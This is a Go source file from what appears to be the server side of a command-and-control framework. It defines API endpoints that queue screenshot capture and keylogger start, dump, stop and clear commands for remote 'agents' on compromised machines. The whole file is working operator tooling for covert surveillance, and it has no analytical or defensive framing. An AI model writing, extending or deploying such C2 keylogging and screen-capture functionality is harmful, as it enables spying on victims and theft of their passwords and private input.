package api

import (
	"fmt"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/mjopsec/taburtuaiC2/internal/services"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// Screenshot queues a full-desktop screenshot capture.
// POST /api/v1/agent/:id/screenshot
func (h *Handlers) Screenshot(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "screenshot",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       30,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "SCREENSHOT", "", true)
	h.APIResponse(c, true, "Screenshot queued", map[string]interface{}{"command_id": cmd.ID}, "")
}

// KeylogStart queues a keylogger start on the agent.
// POST /api/v1/agent/:id/keylog/start
// Body: { "duration": 60 }  (0 = run until explicit stop)
func (h *Handlers) KeylogStart(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	var req struct {
		Duration int `json:"duration"`
	}
	c.ShouldBindJSON(&req)

	cmd := &types.Command{
		ID:             uuid.New().String(),
		AgentID:        agentID,
		OperationType:  "keylog_start",
		KeylogDuration: req.Duration,
		CreatedAt:      time.Now(),
		Status:         "pending",
		Timeout:        15,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "KEYLOG_START",
		fmt.Sprintf("duration=%ds", req.Duration), true)
	h.APIResponse(c, true, "Keylogger start queued", map[string]interface{}{
		"command_id": cmd.ID,
		"duration":   req.Duration,
	}, "")
}

// KeylogDump retrieves buffered keystrokes from the agent.
// POST /api/v1/agent/:id/keylog/dump
func (h *Handlers) KeylogDump(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "keylog_dump",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       15,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "KEYLOG_DUMP", "", true)
	h.APIResponse(c, true, "Keylog dump queued", map[string]interface{}{"command_id": cmd.ID}, "")
}

// KeylogStop stops the keylogger on the agent and returns the final buffer.
// POST /api/v1/agent/:id/keylog/stop
func (h *Handlers) KeylogStop(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "keylog_stop",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       15,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "KEYLOG_STOP", "", true)
	h.APIResponse(c, true, "Keylogger stop queued", map[string]interface{}{"command_id": cmd.ID}, "")
}

// KeylogClear discards the buffered keystrokes without returning them.
// POST /api/v1/agent/:id/keylog/clear
func (h *Handlers) KeylogClear(c *gin.Context) {
	agentID := c.Param("id")
	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "keylog_clear",
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       10,
	}
	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "KEYLOG_CLEAR", "", true)
	h.APIResponse(c, true, "Keylog buffer cleared", map[string]interface{}{"command_id": cmd.ID}, "")
}
